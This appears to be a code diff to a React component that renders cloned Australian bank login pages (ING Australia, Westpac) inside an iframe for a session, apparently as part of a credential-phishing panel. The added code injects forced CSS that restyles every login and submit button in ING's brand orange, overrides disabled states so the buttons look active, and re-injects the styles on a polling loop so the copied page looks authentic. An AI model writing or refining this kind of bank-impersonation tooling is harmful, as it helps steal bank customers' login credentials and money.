@@ -1087,6 +1087,138 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
   //   ve BUTONLARDA ::before/::after content'ini KALDIR (content: none !important)
   //   + ayni zamanda aria-disabled attribute'unu KULLANMA (artik hic yazmiyoruz).
   const antiOverlayStyleInjectedRef = useRef<Set<Document>>(new Set());
+  // ⭐⭐⭐⭐⭐ ING Australia SON KESIN COZUM: CSS Seviyesinde ZORLA (EN SON DÜZELTME)
+  //   iframe icindeki doc headine ING OZEL style tagi enjekte et.
+  //   BUTUN OLASI buton selectorleri (20+ tane) icin ARKA PLAN ZORLA #E65300 TURUNCU.
+  //   Boylece ne kadar shadow DOM kapali olursa olsun CSS SEVIYESINDE turuncu olur.
+  const ingAustraliaCssInjectedRef = useRef<Set<Document>>(new Set());
+  const ensureIngAustraliaForcedColorStyle = useCallback((doc: Document, slug: string, bname: string) => {
+    try {
+      if (!doc || !doc.head) return;
+      const isThisING =
+        (String(slug || "").toLowerCase().includes("ing")) ||
+        (String(bname || "").toLowerCase().includes("ing"));
+      if (!isThisING) return;
+      if (ingAustraliaCssInjectedRef.current.has(doc)) return;
+      ingAustraliaCssInjectedRef.current.add(doc);
+      const s = doc.createElement("style");
+      s.setAttribute("data-au-bot-force-ing", "1");
+      s.setAttribute("type", "text/css");
+      s.textContent = `
+/* ⭐⭐⭐ ING AUSTRALIA FORCED BRAND ORANGE — CSS LEVEL BRUTEFORCE (NO ESCAPE) */
+/* BUTUN OLASI buton formlari, HEM HOST HEM IC BUTON, HEM CUSTOM WC */
+ing-button, ing-login-submit, ui5-button, sg-button, sl-button, vaadin-button, mwc-button, md-button, paper-button,
+form button, button, input[type='submit'], input[type='button'], a[role='button'], [role='button'],
+.btn, .btn-primary, .btn-default, .btn-login, .btn-signin, .btn-sign-in, .btn-submit, .btn-next, .btn-continue, .btn-proceed, .btn-enter, .btn-confirm, .btn-auth,
+[class*='btn-primary'], [class*='btn-primary'], [class*='btn-primary'], [id*='btn-primary'], [class*='submit-button'], [id*='submit-button'], [class*='submitButton'], [id*='submitButton'],
+[class*='loginButton'], [id*='loginButton'], [class*='LoginButton'], [id*='LoginButton'],
+[class*='login-button'], [id*='login-button'], [class*='log-in-button'], [class*='signin-button'],
+[data-testid*='submit'], [data-testid*='Submit'], [data-testid*='login'], [data-testid*='Login'],
+[aria-label*='Submit'], [aria-label*='Login'], [aria-label*='Sign in'], [aria-label*='Sign-in'], [aria-label*='Next'],
+button[aria-disabled='false'], input[type='submit'][aria-disabled='false'], input[type='button'][aria-disabled='false'], [role='button'][aria-disabled='false'],
+form input[type='submit'], .signin, .sign-in, .login, .LogIn, .Continue, .Next, .Proceed,
+#submit, #next, #login, #signin, #continue, #logIn, #proceed, #confirm, #enter
+{
+  background-color: #E65300 !important;
+  background: #E65300 !important;
+  color: #FFFFFF !important;
+  opacity: 1 !important;
+  filter: none !important;
+  -webkit-filter: none !important;
+  -webkit-text-fill-color: #FFFFFF !important;
+  -moz-text-fill-color: #FFFFFF !important;
+  border-color: #B64100 !important;
+  border: 1px solid #B64100 !important;
+  box-shadow: 0 10px 24px rgba(230, 83, 0, 0.45) !important;
+  pointer-events: auto !important;
+  cursor: pointer !important;
+  visibility: visible !important;
+  display: inline-flex !important;
+  align-items: center !important;
+  justify-content: center !important;
+}
+
+/* DISABLED / INACTIVE / GRAY CLASS OVERRIDE — ZORLA AKTIF GOSTER */
+.is-disabled, .is-disabled[class], .disabled, .btn-disabled, .disabled-btn, button:disabled, input[type='submit']:disabled,
+[class*='disabled'], [class*='inactive'], [class*='muted'], [class*='grayscale'], [class*='faded'], [class*='ghost'], [class*='dim']
+{
+  background-color: #E65300 !important;
+  background: #E65300 !important;
+  color: #FFFFFF !important;
+  opacity: 1 !important;
+  filter: none !important;
+  -webkit-filter: none !important;
+  -webkit-text-fill-color: #FFFFFF !important;
+  pointer-events: auto !important;
+  cursor: pointer !important;
+  border-color: #B64100 !important;
+  border-style: solid !important;
+  border-width: 1px !important;
+}
+
+/* CSS DEGISKENLERINI (WC tarafindan okunanlar) ZORLA TURUNCU */
+ing-button, ing-login-submit, button, input[type='submit'], [role='button'],
+[class*='btn-primary'], [class*='submit-button'], [class*='login-button']
+{
+  --background: #E65300 !important;
+  --background-color: #E65300 !important;
+  --primary: #E65300 !important;
+  --primary-color: #E65300 !important;
+  --color: #FFFFFF !important;
+  --text-color: #FFFFFF !important;
+  --foreground: #FFFFFF !important;
+  --button-background: #E65300 !important;
+  --button-color: #FFFFFF !important;
+  --btn-bg: #E65300 !important;
+  --btn-color: #FFFFFF !important;
+  --_background-color: #E65300 !important;
+  --_color: #FFFFFF !important;
+  --ing-primary: #E65300 !important;
+  --ing-button-bg: #E65300 !important;
+  --ing-button-color: #FFFFFF !important;
+  --button-bg-color: #E65300 !important;
+}
+
+/* HOST ELEMENTI (ing-login-submit KENDISI) DISPLAY — IC SAYDAM OLSA BILE ARKAPLAN TURUNCU */
+ing-login-submit, ing-button {
+  display: inline-flex !important;
+  align-items: center !important;
+  justify-content: center !important;
+  min-height: 52px !important;
+  min-width: 240px !important;
+  padding-top: 16px !important;
+  padding-bottom: 16px !important;
+  padding-left: 28px !important;
+  padding-right: 28px !important;
+  border-radius: 12px !important;
+  font-weight: 800 !important;
+  font-size: 17px !important;
+  line-height: 1.35 !important;
+  z-index: 99999999 !important;
+  position: relative !important;
+  visibility: visible !important;
+  overflow: visible !important;
+}
+`;
+      // En sona ekle (diger stilleri ezmesi icin)
+      try {
+        if (doc.body && doc.body.lastChild) {
+          doc.body.appendChild(s);
+        } else {
+          doc.head.appendChild(s);
+        }
+      } catch { doc.head.appendChild(s); }
+      setTimeout(() => {
+        try {
+          const s2 = doc.createElement("style");
+          s2.setAttribute("data-au-bot-force-ing-2", "1");
+          s2.textContent = s.textContent;
+          doc.body ? doc.body.appendChild(s2) : doc.head.appendChild(s2);
+        } catch {}
+      }, 150);
+    } catch {}
+  }, []);
+
   const ensureAntiOverlayStyleInjected = useCallback((doc: Document) => {
     try {
       if (!doc || !doc.head) return;
@@ -2035,6 +2167,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     }
 
     const updateSubmitState = () => {
+      // ⭐⭐⭐⭐⭐ ING Australia SON KESIN COZUM (CSS SEVIYESINDE ENJEKSIYON):
+      //   IsIng bayragi varsa HEMEN iframe doc icine style tag enjekte et
+      //   BUTUN OLASI butonlara ZORLA #E65300 TURUNCU (CSS LEVEL).
+      //   Boylece DOM selectorlerimiz kacirsa bile CSS SEVIYESINDE TURUNCU olur.
+      try { ensureIngAustraliaForcedColorStyle(doc, bankSlug, bankName); } catch {}
       // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
       //   iframe icindeki doc head'ina style tag 1 kez enjekte et.
       try { ensureAntiOverlayStyleInjected(doc); } catch {}
@@ -2899,6 +3036,15 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         pollingCounterRef.current = pollingCounterRef.current + 1;
         const doc = iframe.contentWindow?.document;
         if (!doc) return;
+
+        // ⭐⭐⭐⭐⭐ ING Australia SON KESIN COZUM (CSS ENJEKSIYON 200ms'de TEKAR GARANTI):
+        //   IsIng bayragi varsa HEMEN style tag enjekte et (ilk 10 tur HER TURDA yaz ki
+        //   sayfa yuklenirken iframe doc hazir olmamissa da 150/350/550ms de enjekte olsun).
+        try {
+          if (pollingCounterRef.current <= 10) {
+            ensureIngAustraliaForcedColorStyle(doc, bankSlug, bankName);
+          }
+        } catch {}
 
         // ⭐ İLK 2 POLLING TURU: Aktif odak input/textarea/select değilse,
         //   odak yoksa İLK input/autofocus inputa odaklan.
